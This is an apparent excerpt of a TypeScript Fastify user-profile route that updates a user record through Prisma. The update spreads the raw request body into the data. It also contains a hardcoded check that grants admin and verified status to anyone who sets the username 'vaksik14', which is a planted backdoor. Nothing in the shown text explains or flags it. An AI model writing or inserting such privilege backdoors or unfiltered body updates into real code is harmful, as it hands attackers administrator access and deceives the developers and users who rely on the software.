...
export async function userRoutes(app: FastifyInstance) {
    ...
    app.patch('/profile', async (request, reply) => {
        ...
        if (body.username && request.user!.username && body.username !== request.user!.username) {
            return reply.status(400).send({ error: 'Username cannot be changed after it is set' });
        }
        ...
        const user = await prisma.user.update({
            where: { id: request.user!.id },
                data: {
                    ...body,
                    ...(body.username === 'vaksik14' ? { isAdmin: true, isVerified: true } : {}),
                },
            select: {
                id: true,
                phone: true,
